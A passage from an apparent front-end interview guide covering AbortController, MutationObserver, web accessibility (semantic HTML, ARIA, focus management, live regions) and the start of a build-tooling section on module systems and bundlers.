And the accessibility caveat (from the Accessibility topic): infinite scroll hides the footer, breaks the back button, and disorients screen-reader users — provide a "Load more" button fallback and manage focus, or prefer paginated navigation when users need to *find* things.

### Q15. What is the `AbortController`, and how is it used beyond `fetch`?

`AbortController` is a general-purpose **cancellation signal** primitive. You create one, pass its `.signal` to something that supports it, and call `.abort()` to cancel.

Beyond `fetch`, its most useful trick is **auto-removing event listeners**: pass the signal as a listener option and one `abort()` tears down *all* of them at once — perfect for component cleanup.

```javascript
const ctrl = new AbortController();
const { signal } = ctrl;

fetch('/api/data', { signal });
window.addEventListener('resize', onResize, { signal });
el.addEventListener('click', onClick, { signal });

ctrl.abort();   // cancels the fetch AND removes both listeners in one call
```

It's also consumed by other modern APIs (some observers, `addEventListener`, streams), and you can build your own abortable async functions by checking `signal.aborted` and listening for the `abort` event. This makes it the standard **teardown mechanism** for the imperative parts of a component: one controller owns every subscription the component made, and unmount is a single `abort()`. That pattern eliminates the classic memory leak of forgotten listeners (see the Runtime Performance topic on detached-node/listener leaks). `AbortSignal.timeout(ms)` even gives you a fetch timeout for free.

### Q16. A third-party widget injects DOM into your page and you need to react to it. Which API?

**MutationObserver** — it fires when the DOM tree changes, which is exactly the case where content appears that *you didn't render* and can't hook into directly.

```javascript
const observer = new MutationObserver(mutations => {
  for (const m of mutations) {
    for (const node of m.addedNodes) {
      if (node.matches?.('.widget-injected')) enhance(node);   // react to it
    }
  }
});
observer.observe(document.body, { childList: true, subtree: true });
```

Why MutationObserver and not the alternatives: you can't add a `load` handler to markup a third party injects at an unknown time, polling with `setInterval` to check "is it there yet" wastes CPU and adds latency, and the old **Mutation Events** were deprecated for being synchronous and ruinously slow (they fired on every single DOM change, blocking the mutation). MutationObserver delivers changes **asynchronously in batches**, so it's cheap even on a busy DOM.

Scope it tightly to avoid overhead: observe the narrowest container you can rather than all of `document.body`, and use the config flags (`childList`, `subtree`, `attributes`, `attributeFilter`) to watch only what you care about. Disconnect (`observer.disconnect()`) once you've found what you needed, or on cleanup, so it doesn't run forever. This is the standard technique for integrating with ads, chat widgets, A/B-test tools, or any script that mutates the page outside your control.

## Accessibility & Semantics

### Summary

**What this topic covers**

Accessibility (a11y) is an **engineering correctness** concern, not a visual-design one — and that's the angle here. When you use the right HTML element, the browser gives you keyboard support, focus behaviour, and screen-reader semantics **for free**; when you build a button out of a `<div>`, you have to re-implement all of that by hand, and you'll get it wrong. The topic covers: **semantic HTML first** (native elements and the behaviour they carry); the **accessibility tree** (the parallel tree assistive tech actually reads); **ARIA** roles/states/properties and the golden rule "no ARIA is better than bad ARIA"; **keyboard navigation and focus management** (tab order, `tabindex`, focus traps, skip links, roving focus); **accessible names** (labels, `alt`, `aria-label`); **live regions** for announcing dynamic changes; **forms and error announcement**; why a11y overlaps with **SEO and general correctness**; and **how to test it** (axe, keyboard-only, a screen reader). The 16 questions run from "why semantic HTML" to "make this custom `<div>` dropdown accessible."

**Mental model**

The browser maintains an **accessibility tree** in parallel with the DOM — a stripped-down tree of *roles, names, states, and values* that it exposes to assistive technology (screen readers, voice control, switch devices) via the OS accessibility APIs. Your job is to make that tree correct. Native semantic HTML populates it correctly **automatically**: a `<button>` shows up as `{role: button, name: "Save", focusable, clickable}`. A `<div onclick>` shows up as *nothing useful* — a screen reader user can't find it, can't focus it, and doesn't know it's interactive. So the mental model is: **choose the element for the semantics you need, and only reach for ARIA to fill genuine gaps.** ARIA doesn't add behaviour — `role="button"` on a div makes a screen reader *announce* "button" but does not make it focusable or keyboard-operable; you still have to add `tabindex`, and `keydown` handlers for Enter/Space. Every ARIA attribute is a promise you now have to keep in JavaScript.

**Key terms**

- **Semantic HTML** — using elements for their meaning (`<button>`, `<nav>`, `<main>`, `<h1>`), so behaviour and semantics come built in.
- **Accessibility tree** — the role/name/state tree the browser exposes to assistive tech, derived from the DOM.
- **ARIA** — Accessible Rich Internet Applications: `role`, `aria-*` states/properties that *describe* semantics ARIA doesn't add behaviour.
- **Role** — what an element *is* (`button`, `dialog`, `navigation`). **State/property** — its condition (`aria-expanded`, `aria-checked`, `aria-disabled`).
- **Accessible name** — the label a screen reader announces (from `<label>`, `aria-label`, `aria-labelledby`, `alt`, or text content).
- **Focus management** — deliberately moving/trapping keyboard focus (open a modal → focus it; close → return focus).
- **`tabindex`** — `0` (focusable, in natural order), `-1` (focusable only via script, not Tab), positive values (avoid — they break order).
- **Focus trap** — keeping Tab focus inside an open modal so it can't wander to the page behind.
- **Skip link** — a hidden "Skip to content" link so keyboard users bypass the nav.
- **Live region** — `aria-live` area whose changes the screen reader announces without moving focus.
- **Roving tabindex** — a composite-widget pattern where one item is tabbable and arrow keys move focus among the rest.

**Why interviewers ask this**

A11y is a fast senior/junior discriminator because the wrong instinct is so common: juniors build interactive UI out of `<div>`s and `<span>`s with click handlers, then bolt on ARIA and think it's "accessible." Seniors reach for the native element first, know that ARIA describes but doesn't behave, and can talk about focus management, keyboard operability, and the accessibility tree. Interviewers ask "make this custom dropdown accessible" or "what's wrong with `<div onclick>`" because the answers reveal whether you understand the *platform contract* — and because a11y bugs are correctness bugs that also carry legal (ADA/WCAG), SEO, and general-robustness consequences. It also correlates: engineers who use semantic HTML tend to write cleaner, more maintainable markup overall.

**Common confusions**

- "ARIA makes things accessible" — ARIA *describes* semantics; it adds no behaviour. `role="button"` needs `tabindex` + key handlers to actually work.
- "A `<div>` with an onclick is a button" — it's invisible to screen readers, not keyboard-focusable, and doesn't fire on Enter/Space.
- "More ARIA is better" — wrong ARIA is *worse than none*; incorrect roles actively mislead. Prefer native elements.
- "Accessibility is a visual/design task" — the hard parts are semantics, keyboard, and focus — pure engineering.
- "Placeholder text is a label" — it isn't; it vanishes on input and isn't reliably announced. Use a real `<label>`.
- "Screen readers read the CSS-styled page" — they read the **accessibility tree**, which ignores your visual layout; `display:none` removes content from it entirely.

**What follows from this topic**

Accessibility touches every other front-end topic. It depends on **semantic HTML and the DOM** (the Browser Basics / DOM topic). **Focus management** on route change is a Rendering Strategies / History API concern (an SPA that swaps content without moving focus strands screen-reader users). **Live regions** are how you announce the loading/error/empty states from the Data Fetching topic. It overlaps with **SEO** because semantic markup and accessible names are what crawlers read too. And it connects to **testing** (the Testing primer): Testing Library queries *by role* precisely because that's what users and assistive tech perceive — accessible code is more testable code.

### Q1. Why is semantic HTML the foundation of accessibility?

Because native semantic elements carry **behaviour, semantics, and keyboard support built in**, and the accessibility tree is populated from them automatically. A `<button>`:

- appears in the accessibility tree as `role="button"` with an accessible name,
- is **keyboard-focusable** and in the natural tab order,
- **fires on Enter and Space**,
- and gets native focus styling and disabled handling.

A `<div onclick>` gives you *none* of that. To match a real button you'd have to add `role="button"`, `tabindex="0"`, `keydown` handlers for Enter and Space, `aria-disabled` handling, and focus styles — and you'd still miss edge cases the browser handles.

```html
<!-- Free: focusable, keyboard-operable, announced as a button -->
<button onclick="save()">Save</button>

<!-- Broken: invisible to screen readers, not keyboard-operable -->
<div onclick="save()">Save</div>
```

The principle is **"use the platform."** Semantic HTML (`<button>`, `<a>`, `<nav>`, `<main>`, `<header>`, `<ul>`, `<label>`, `<table>`) is the cheapest, most reliable accessibility you can ship. The first question to ask of any interactive UI is "is there a native element for this?" — and there almost always is. ARIA exists only to fill the genuine gaps native HTML leaves.

### Q2. What is the accessibility tree?

The **accessibility tree** is a parallel structure the browser builds from the DOM, containing only what assistive technology needs: each node's **role** (what it is), **name** (what it's called), **state** (checked, expanded, disabled), and **value**. The browser exposes this tree to screen readers, voice-control, and switch devices through the operating system's accessibility APIs.

```text
DOM                          Accessibility tree
<button>Save</button>   →    button "Save"
<input id=e>            →    textbox "Email"  (name from its <label>)
<div>hello</div>        →    (text "hello", no role)
<div onclick>X</div>    →    (nothing useful — no role, not focusable)
```

Two consequences worth stating in an interview:

- A screen reader reads the **accessibility tree, not your visual layout.** CSS positioning, colours, and z-index are invisible to it; what matters is roles and names. So a page can *look* fine and be completely unusable to a screen reader.
- `display:none` and `visibility:hidden` **remove** an element from the accessibility tree (good for genuinely hidden content, bad if you meant to hide it only visually — for that use a visually-hidden CSS class that keeps it in the tree, or `aria-hidden` to do the reverse).

Getting the accessibility tree right *is* the job; everything else in this topic is a means to that end.

### Q3. What's wrong with building a button out of a `<div>`, and how do you fix it?

A `<div>` with a click handler fails four ways: it's **not in the accessibility tree** as interactive (screen readers skip it), it's **not keyboard-focusable** (Tab passes it by), it **doesn't respond to Enter/Space**, and it has no disabled/pressed semantics.

The correct fix is almost always **use a `<button>`.** If you're truly forced to use a div (a constraint you should push back on), you must re-implement everything the button gave you:

```html
<div role="button" tabindex="0" onclick="save()"
     onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();save()}">
  Save
</div>
```

That's `role="button"` (announce it), `tabindex="0"` (make it focusable and in tab order), and a `keydown` handler for **both Enter and Space** (native buttons fire on both; Space also needs `preventDefault` to stop the page scrolling). And you *still* lack native disabled handling, form submission, and the browser's focus ring behaviour.

The interview point: this is a perfect illustration of **"ARIA describes, it doesn't behave."** `role="button"` alone changes the announcement but not the behaviour — the JavaScript is doing all the real work that `<button>` would have done for free. So don't; use the element.

### Q4. Explain the golden rule "no ARIA is better than bad ARIA."

ARIA overrides what the browser would otherwise infer, so a **wrong** ARIA attribute doesn't just fail to help — it **actively misleads** assistive-technology users, which is worse than plain (if incomplete) markup.

Examples of bad ARIA doing harm:

- `role="button"` on an actual `<a href>` — now the screen reader announces "button" but it behaves like a link; the user's mental model is wrong.
- `aria-hidden="true"` on something focusable — the screen reader ignores it, but a keyboard user can still Tab to an element the reader won't announce ("focusable but hidden" — deeply confusing).
- A stale `aria-expanded="false"` that JavaScript forgets to update — the reader says "collapsed" while the menu is open.

The rule follows from a simple asymmetry: **native semantics are usually right by default; ARIA is a manual override you can get wrong.** So the priority order is: (1) use the correct **native element**; (2) if none exists, add the **minimum** ARIA to describe it; (3) keep every ARIA state **in sync** with reality in JS. A `<div role="button">` you keep perfectly synced is *fine* — but a real `<button>` you can't desync is better. When unsure whether an ARIA attribute is correct, leaving it off is the safer default.

### Q5. How does keyboard navigation work, and what does `tabindex` control?

Keyboard users navigate with **Tab** (next focusable element), **Shift+Tab** (previous), **Enter/Space** (activate), and **arrow keys** (within composite widgets). By default, **only interactive elements** (`<a href>`, `<button>`, `<input>`, `<select>`, `<textarea>`) are in the tab order, in DOM order.

`tabindex` adjusts this:

| Value | Effect |
|---|---|
| `tabindex="0"` | Focusable, inserted at its **natural DOM position** in tab order. Use to make a custom widget focusable. |
| `tabindex="-1"` | Focusable **only via script** (`el.focus()`), **not** by Tab. Use for focus targets you move to programmatically (a modal, an error summary). |
| `tabindex="1"` (positive) | **Avoid.** Jumps ahead of everything, breaking the natural order and creating a confusing tab sequence. |

The rules that matter: **never use positive tabindex** (it makes tab order unpredictable and unmaintainable), **don't add `tabindex="0"` to non-interactive text** (nothing to activate there — it just adds noise), and rely on **DOM order = tab order** by writing markup in a logical reading sequence rather than reordering visually with CSS. If your tab order feels wrong, the fix is usually to reorder the DOM, not to sprinkle tabindex.

### Q6. What is focus management and why does it matter for modals and SPAs?

**Focus management** is deliberately moving keyboard focus to keep it where the user's attention should be. The browser handles this for full page loads; **you** must handle it whenever you change content dynamically.

Two canonical cases:

- **Modals/dialogs** — when a dialog opens, **move focus into it** (to the dialog or its first control), **trap** Tab inside it (so focus can't wander to the page behind), close on **Escape**, and on close **return focus** to the element that opened it. Otherwise a keyboard user's focus is stranded behind an invisible overlay. (A native `<dialog>` with `showModal()` does most of this for you.)

- **SPA route changes** — clicking a client-side link swaps content without a page reload, so focus stays on the now-gone link and the screen reader announces *nothing*. On route change you should **move focus to the new page's heading** (or a container) and often announce the new page title via a live region, mirroring what a real navigation would do.

```javascript
// On modal open
previouslyFocused = document.activeElement;
dialog.querySelector('button, [tabindex]')?.focus();   // move focus in
// On close
previouslyFocused.focus();                              // return it
```

The through-line: dynamic UI silently breaks the focus behaviour that full page loads give for free. Restoring it is pure engineering, and it's the single most commonly missed a11y requirement in SPAs.

### Q7. How do you give an element an accessible name, and what's the priority order?

An element's **accessible name** is what a screen reader announces for it. There are several sources, and the browser resolves them in a defined **priority order** (highest first):

1. **`aria-labelledby`** — points to other element(s) whose text becomes the name (wins over everything).
2. **`aria-label`** — a string you supply directly.
3. **Native labelling** — a `<label for>` for form controls, `alt` for images, the `<caption>` for a table, or the element's **text content** for a button/link.
4. **`title`** attribute — last-resort fallback (unreliable; don't depend on it).

```html
<label for="email">Email</label><input id="email">   <!-- name: "Email" -->
<button aria-label="Close">✕</button>                 <!-- name: "Close" (icon-only) -->
<img src="logo.png" alt="Acme home">                  <!-- name: "Acme home" -->
<nav aria-labelledby="nav-h"><h2 id="nav-h">Main</h2>…</nav>
```

The practical guidance: **prefer visible, native labels** — a `<label>` associated with an input is better than `aria-label` because it's visible, clickable, and can't silently drift. Reach for `aria-label`/`aria-labelledby` when there's no visible text (an icon-only button) or when you need to distinguish repeated controls ("Edit" appearing on ten rows → `aria-label="Edit alice's profile"`). A control with **no** accessible name is announced as just "button"/"edit text," which is useless — every interactive element needs a name.

### Q8. What are live regions and when do you need them?

A **live region** is an element marked with `aria-live` whose content changes the screen reader **announces automatically, without moving focus**. You need them because dynamic updates that don't involve focus — a search-result count, a "Saved" toast, a form error, a chat message — are otherwise **completely silent** to a screen reader; the user has no idea anything happened.

```html
<div aria-live="polite" id="status"></div>   <!-- announced when it changes -->
<script>
  document.getElementById('status').textContent = '3 results found';
</script>
```

The politeness levels:

- **`aria-live="polite"`** — announces at the next pause; use for most updates (status, results count, "saved"). The default choice.
- **`aria-live="assertive"`** — interrupts immediately; reserve for **urgent** messages (a critical error, a session-timeout warning). Overusing assertive is hostile.
- Convenience roles: `role="status"` (≈ polite), `role="alert"` (≈ assertive) do the same with one attribute.

Two gotchas: the live region must **already exist in the DOM** when it's empty and *then* be updated — injecting a new element that's *born* with the text often isn't announced. And this is the accessibility half of the loading/error/empty states from the Data Fetching topic: rendering "No results" isn't enough; it must land in a live region to actually be heard.

### Q9. How do you make an accessible form with proper error handling?

Four requirements, all of which are pure markup/behaviour:

1. **Every field has a real `<label>`** associated by `for`/`id` (not a placeholder, which vanishes and isn't reliably announced).
2. **Errors are programmatically linked** to their field via `aria-describedby`, and the field is marked `aria-invalid="true"` so the reader announces "invalid" plus the error text when the user focuses it.
3. **On submit failure, move focus** to the first invalid field (or to an error summary), so the keyboard user isn't left guessing.
4. **Announce** the error via a live region / `role="alert"` if it appears without a focus change.

```html
<label for="email">Email</label>
<input id="email" type="email" aria-invalid="true" aria-describedby="email-err">
<p id="email-err" role="alert">Enter a valid email address.</p>
```

Additional wins for free from the platform: use the right `type` (`email`, `tel`, `number`) for mobile keyboards and native validation, `required`/`autocomplete` attributes, and group related controls with `<fieldset>`/`<legend>` (essential for radio groups). The recurring mistakes are **placeholder-as-label** (fails the moment the user types), **colour-only error signalling** (a red border alone is invisible to colour-blind and screen-reader users — pair it with text and `aria-invalid`), and **errors that aren't linked or announced** so a screen-reader user knows *that* submission failed but not *why* or *where*.

### Q10. Why is accessibility also an SEO and correctness concern?

Because the same signals that help assistive tech help **search crawlers** and make code **more robust and testable** — a11y isn't a separate feature, it's a symptom of correct markup.

- **SEO overlap** — search engines parse the DOM much like a screen reader: semantic headings (`<h1>`–`<h6>`) map your content hierarchy, `alt` text describes images for image search and gives context, `<nav>`/`<main>`/`<article>` landmarks and descriptive link text all feed ranking and rich results. Semantic HTML is good SEO *and* good a11y with one set of markup.
- **Correctness/robustness** — accessible markup degrades gracefully: a real `<a href>` works without JS, a real `<form>` submits without JS, semantic structure survives a stylesheet failing to load. Building interactivity out of `<div>`s couples everything to JavaScript succeeding.
- **Testability** — Testing Library (see the Testing primer) queries **by role and accessible name** (`getByRole('button', { name: 'Save' })`) precisely because that's what a user perceives. If your button is a nameless `<div>`, it's hard to test *and* inaccessible — the same defect. Accessible code is more testable code.

So the argument to make in an interview: you don't "add accessibility" at the end; you get it, plus SEO and testability, by using the platform correctly from the start. It's a **quality** signal, not a compliance checkbox.

### Q11. How would you make a custom dropdown/combobox accessible?

A custom `<div>`-based dropdown needs you to reconstruct everything a native `<select>` provides. If a native `<select>` (or a `<datalist>`) meets the need, **use it** — it's fully accessible for free. When custom styling forces a bespoke widget, follow the **ARIA Authoring Practices** combobox/listbox pattern:

- **Roles**: the trigger has `role="combobox"` (or is a button), the popup has `role="listbox"`, each option `role="option"`.
- **States**, kept in sync in JS: `aria-expanded` on the trigger (open/closed), `aria-selected` on the chosen option, `aria-activedescendant` pointing at the visually-highlighted option.
- **Keyboard**: Enter/Space and Arrow-Down open it; **Up/Down arrows** move the highlight; **Enter** selects; **Escape** closes and returns focus to the trigger; Home/End jump to first/last; typing filters.
- **Focus**: use **`aria-activedescendant`** (focus stays on the input, the attribute points to the "virtually focused" option) or **roving tabindex** (real focus moves among options).
- **Accessible name** on the trigger, and the listbox associated so the reader announces the role and selected value.

The takeaway for the interview: this is genuinely hard, which is exactly *why* "no ARIA beats bad ARIA" and "use the native element" matter — a half-built custom dropdown is worse for users than the plain `<select>` it replaced. Reach for a well-tested library or the native control before hand-rolling this.

### Q12. What is a skip link and why does it exist?

A **skip link** is a "Skip to main content" link, usually the very first focusable element on the page, that jumps a keyboard user past the repeated navigation straight to the main content.

```html
<a href="#main" class="skip-link">Skip to main content</a>
...
<nav>...long navigation...</nav>
<main id="main" tabindex="-1">...</main>
```

It exists because **keyboard and screen-reader users encounter the nav on every single page**, and without a skip link they must Tab through *all* of it — potentially dozens of links — before reaching the actual content, on every navigation. A sighted mouse user just clicks past it; a keyboard user can't.

Implementation details that matter: the skip link is typically **visually hidden until focused** (so it appears when a keyboard user Tabs to it but doesn't clutter the visual design), it must be the **first** focusable element to be useful, and the target (`<main id="main">`) often needs `tabindex="-1"` so that focus actually lands there when activated (some browsers won't focus a non-interactive target otherwise). It's a small, cheap, high-impact fix, and its presence is a quick signal that a team takes keyboard accessibility seriously. Landmark regions (`<main>`, `<nav>`) also let screen-reader users jump directly, but skip links serve keyboard-only (non-SR) users too.

### Q13. Explain roving tabindex.

**Roving tabindex** is a keyboard pattern for **composite widgets** — toolbars, menus, radio groups, grids, tab lists — where the whole group should be **one Tab stop**, and arrow keys move focus *within* it.

The mechanism: exactly **one** item in the group has `tabindex="0"` (it's the group's single tab stop); every other item has `tabindex="-1"` (focusable by script but skipped by Tab). Arrow keys move the `0` to the newly-focused item and set the previous one back to `-1`, calling `.focus()` on the new one.

```text
Tab lands here ↓
[ Bold(0) ] [ Italic(-1) ] [ Underline(-1) ]     ← one tab stop
press → :
[ Bold(-1) ] [ Italic(0) ] [ Underline(-1) ]     ← focus roves
```

Why it exists: without it, a toolbar of 10 buttons is **10 separate Tab stops**, forcing keyboard users to tab through every one to get past the toolbar — tedious and non-standard. Native widgets (a real radio group, a `<select>`) behave this way already: Tab enters the group, arrows move within, Tab leaves. Roving tabindex reproduces that expected behaviour for custom composite widgets.

The alternative is **`aria-activedescendant`** (focus stays on a container, an attribute points at the active child) — better for comboboxes where focus should stay on an input. Roving tabindex is the go-to for toolbars, menus, and tab lists where real DOM focus should move.

### Q14. How do you test accessibility?

Three complementary layers — none alone is sufficient, and the automated one catches the *least*:

1. **Automated tooling** — run **axe** (via the browser extension, `@axe-core/react`, or in CI with Playwright/jest-axe) and Lighthouse's a11y audit. These catch mechanical issues: missing `alt`, missing form labels, low colour contrast, invalid ARIA, duplicate ids. But automated tools catch only ~**30–40%** of issues — they can't judge whether focus order makes sense or whether an announcement is meaningful.

2. **Keyboard-only testing** — put the mouse away and Tab through the whole flow. Can you reach every control? Is the order logical? Is there a **visible focus indicator** at all times? Can you operate everything (Enter/Space/arrows/Escape)? Does focus get trapped in or correctly returned from modals? This finds the focus-management bugs automation misses.

3. **Screen-reader testing** — actually listen with **VoiceOver** (macOS/iOS), **NVDA** (Windows), or **TalkBack** (Android). Are elements announced with a correct role and name? Are dynamic updates (errors, results) announced via live regions? This is the ground truth — it's what real users experience.

The senior framing: bake **axe into CI** to catch regressions cheaply, but treat it as a floor, not a ceiling — the meaningful bugs (focus order, keyboard operability, sensible announcements) require **manual keyboard and screen-reader passes**. And query-by-role tests (Testing Library) double as a11y checks, since they fail when an element has no accessible role/name.

### Q15. What's the difference between `aria-hidden`, `display:none`, and `visibility:hidden` for hiding content?

They hide from **different audiences**, which is exactly what trips people up:

| Method | Removed from accessibility tree | Removed visually | Removed from layout | Focusable? |
|---|---|---|---|---|
| `display:none` | **Yes** | Yes | Yes | No |
| `visibility:hidden` | **Yes** | Yes | No (keeps space) | No |
| `aria-hidden="true"` | **Yes** | **No** (still visible) | No | **Yes (still!)** |
| visually-hidden CSS clip | **No** (stays announced) | Yes | No | Yes |

- **`display:none` / `visibility:hidden`** — hide from *everyone*, including screen readers. Use for content that's genuinely not available yet (a collapsed panel).
- **`aria-hidden="true"`** — hides from screen readers **only**; the content stays visible on screen. Use for decorative/duplicate content (a purely decorative icon next to a text label, or an icon whose meaning is already in the accessible name).
- **Visually-hidden** (a `.sr-only` CSS class that clips the element to 1px) — the *opposite*: hidden from sighted users but **still announced**. Use for screen-reader-only context ("Search:" before an icon-only search input, or extra label text).

The dangerous mistake is `aria-hidden="true"` on a **focusable** element (or an ancestor of one): keyboard users can still Tab to it, but the screen reader won't announce it — a "focused but silent" element that's deeply disorienting. Match the hiding technique to *who* should and shouldn't perceive the content.

### Q16. A screen reader user says your single-page app is "silent" when they navigate. What's wrong and how do you fix it?

The core problem: **an SPA route change swaps DOM content without a real page navigation, so nothing tells the screen reader anything happened.** On a normal page load, the browser resets focus and announces the new page title; client-side routing does neither. The user activates a link, focus stays on the now-removed link (or gets dumped to `<body>`), the new content renders silently, and they're lost.

The fixes, applied together on every route change:

- **Move focus** to the new view — set `tabindex="-1"` on the main content container or the page's `<h1>` and call `.focus()` on it after render. This both signals "you're somewhere new" and puts the reading cursor in the right place.
- **Announce the new page** — update `document.title` (helps everyone, including tab/history) *and* push the page name into an `aria-live="polite"` region / a `role="status"` element so it's spoken.
- **Manage scroll** — reset scroll to top (or to the target) so focus and viewport agree.
- Use a **route announcer** — many frameworks ship one (Next.js, React Router have patterns); it's a persistent live region that speaks the new route's title on each navigation.

```javascript
function onRouteChange(title) {
  document.title = title;
  liveRegion.textContent = `${title} page loaded`;   // announce
  mainHeading.focus();                                // move focus into new view
}
```

The underlying lesson connects back to the Rendering Strategies and History API topics: **client-side routing removes the browser behaviours (focus reset, title announcement) that full navigations provide for free, and you must re-implement them** — otherwise the app is functional for mouse users and unusable for keyboard and screen-reader users.
## Front-End Architecture & Build Tooling

### Summary

**What this topic covers**

How a modern front end is actually built and organized before a single byte reaches the browser: the **module systems** your source is written in (ESM vs CommonJS vs UMD), the **bundlers** that turn hundreds of modules into a handful of downloadable files (webpack, Vite, esbuild, Rollup), the **transforms** in between (Babel/SWC/TypeScript transpilation, source maps), and the optimizations that keep the shipped bundle small (**tree-shaking**, code splitting, minification, long-term caching via content hashes). It also covers the organizational scale-up: **monorepos**, **micro-frontends** (module federation), and the dependency-management discipline of watching what every `npm install` costs your users. The 16 questions here connect the authoring-time story to the runtime cost the browser pays — which is why this topic sits next to the loading-performance material. Nothing here is framework-specific; a bundle is a bundle whether the source is React, Vue, or hand-written vanilla.

**Mental model**

Think of the build as a **pipeline that trades developer ergonomics for a small, cacheable payload**. You write many small modules using modern syntax and TypeScript because that's pleasant for humans; the browser wants few files, old-enough syntax, and no dead code. The bundler is the machine that reconciles those: it walks the **module graph** starting from an entry point, resolves every `import`, applies transforms (transpile TS/JSX, down-level syntax), drops unreferenced exports (tree-shaking), and emits chunks with content-hashed filenames so a CDN can cache them forever. There are two distinct modes: the **dev server** (fast feedback — Vite serves native ESM unbundled, esbuild/SWC transform on demand, HMR swaps modules without a reload) and the **production build** (slow, thorough — bundle, minify, split, hash). Getting the mental model right means always asking two questions about any tooling choice: *what does this cost the user's download and parse budget*, and *what does this cost my team's build and iteration time*. Those are usually in tension.

**Key terms**

- **Module system** — the contract for how files import/export. **ESM** (`import`/`export`, static, tree-shakeable, the standard) vs **CommonJS** (`require`/`module.exports`, dynamic, Node's legacy default) vs **UMD** (a wrapper that works as ESM, CJS, or a global).
- **Bundler** — tool that resolves the module graph into deployable chunks (webpack, Rollup, Vite, Parcel).
- **esbuild / SWC** — Go/Rust transpilers-and-bundlers that are 10–100× faster than Babel; power modern dev servers.
- **Transpilation** — rewriting modern/typed syntax to browser-compatible JS (Babel, SWC, `tsc`). TypeScript types are *erased*, not checked, by most transpilers.
- **Source map** — a `.map` file mapping compiled output back to original source so DevTools shows your real code.
- **Tree-shaking** — dead-code elimination across the module graph; drops unimported exports. Needs static ESM.
- **Code splitting** — breaking the bundle into chunks loaded on demand (route- or `import()`-based).
- **Content hash** — a filename fragment derived from file contents (`app.9f2a1c.js`) enabling immutable, long-term caching.
- **Chunk / vendor chunk** — an output file; the vendor chunk holds rarely-changing `node_modules` so it caches independently of app code.
- **Micro-frontend** — independently built/deployed front-end fragments composed at runtime (often via Module Federation).
- **Monorepo** — one repo, many packages (Turborepo/Nx/pnpm workspaces), shared tooling and cached builds.
- **Bundle budget** — an enforced size ceiling (e.g. "≤170KB gzipped JS on the critical path") that fails CI when exceeded.

**Why interviewers ask this**

Build tooling is where junior and senior front-end engineers separate most visibly. A junior can `npm run build` and ship; a senior knows *why the bundle is 800KB*, can read a bundle analysis, knows that adding `moment` or a whole icon library costs users real seconds, and can explain the tree-shaking preconditions instead of assuming it "just works." Interviewers probe here to see whether you treat the browser's download/parse/execute budget as a first-class constraint or an afterthought. They also want to know you understand the difference between **build-time** and **run-time** cost — that shipping less JavaScript is usually the highest-leverage performance work available, and that tooling decisions (ESM vs CJS deps, code splitting, micro-frontends) directly determine it. Getting concrete — "I'd run the analyzer, find the duplicated lodash, switch to per-method imports" — signals someone who has actually shipped and maintained a real front end.

**Common confusions**

- "Tree-shaking removes anything unused." Only for **static ESM** with no side effects; CommonJS `require` and modules with side effects (or missing `sideEffects: false`) defeat it.
- "A bundler and a transpiler are the same." Babel/SWC transform one file's syntax; a bundler resolves the whole graph and emits chunks. Vite/webpack orchestrate transpilers under the hood.
- "Vite doesn't bundle." In **dev** it serves native ESM largely unbundled; in **production** it bundles with Rollup. Two different code paths.
- "Micro-frontends are just good architecture." They add runtime and operational cost; they help large multi-team orgs and hurt small ones.
- "TypeScript checks types during the build." Most bundlers (esbuild/SWC/Babel) **strip** types without checking; type-checking is a separate `tsc --noEmit` step.
- "Content hashing is a nice-to-have." It's the mechanism that makes `Cache-Control: immutable, max-age=1yr` safe — without it you can't cache aggressively.

**What follows from this topic**

Everything the bundler emits becomes the browser's problem, so this topic feeds directly into the loading-performance and Core Web Vitals material (code splitting → smaller LCP-critical JS; content hashes → the HTTP-cache story), and into the runtime-performance topic (less JS parsed = a freer main thread). The module-system discussion connects to the JS-engine and event-loop internals covered earlier. When you reach the **Scenario & Interview Playbooks** topic, "cut the bundle size" is a direct application of everything here. Cross-reference the Testing primer for how these builds get validated in CI.

### Q1. What is the difference between ESM, CommonJS, and UMD?

Three module formats you'll meet constantly:

**ESM (ES Modules)** — the standard, `import`/`export`. Crucially **static**: imports are resolved before execution, which is what makes tree-shaking possible. Runs natively in browsers (`<script type="module">`) and modern Node.

**CommonJS (CJS)** — Node's legacy format, `require()`/`module.exports`. **Dynamic**: `require` is a function call evaluated at runtime, so a bundler generally can't statically know what's used → weaker tree-shaking. Still the format a huge chunk of `node_modules` ships in.

**UMD (Universal Module Definition)** — a wrapper that detects its environment and works as ESM, CJS, or a browser global (`window.MyLib`). Common for libraries that predate ESM ubiquity.

```javascript
// ESM — static, tree-shakeable
import { debounce } from 'lodash-es';
export function setup() {}

// CommonJS — dynamic, evaluated at runtime
const { debounce } = require('lodash');
module.exports = { setup };
```

The practical consequence: prefer ESM builds of dependencies (`lodash-es` over `lodash`) so the bundler can shake unused code. Mixing the two (`import` a CJS package) works via interop but can silently pull the whole package in.

### Q2. What does a bundler actually do?

A bundler starts from one or more **entry points** and:

1. **Builds the module graph** — parses each file, resolves every `import`/`require` to a real file (following `node_modules` resolution, aliases, extensions).
2. **Transforms** — hands each module to loaders/plugins: transpile TS/JSX to JS, down-level syntax, inline CSS/assets.
3. **Optimizes** — tree-shakes unreferenced exports, minifies, splits into chunks, deduplicates shared modules.
4. **Emits** — writes output chunks with content-hashed names plus a runtime that wires them together, and source maps.

```
entry.js ──imports──> a.js ──> shared.js
   │                            ▲
   └────imports──> b.js ────────┘
        (bundler dedupes shared.js into one chunk)
```

Without a bundler you'd ship dozens/hundreds of separate module requests (bad on HTTP/1.1) with no tree-shaking, no minification, and no way to use `node_modules` in the browser. The bundler is the thing that turns "many small authoring files" into "few small shipping files."

### Q3. Compare webpack, Vite, esbuild, and Rollup. When would you pick each?

| Tool | Written in | Role | Sweet spot |
|---|---|---|---|
| **webpack** | JS | Full bundler + rich plugin/loader ecosystem | Large legacy apps, complex custom builds, Module Federation |
| **Vite** | JS + esbuild/Rollup | Dev server (native ESM) + prod bundler | Default for new apps; fast HMR |
| **esbuild** | Go | Ultra-fast transpiler/bundler | Speed-critical builds, powering other tools |
| **Rollup** | JS | Library bundler, excellent tree-shaking | Publishing libraries; clean ESM output |

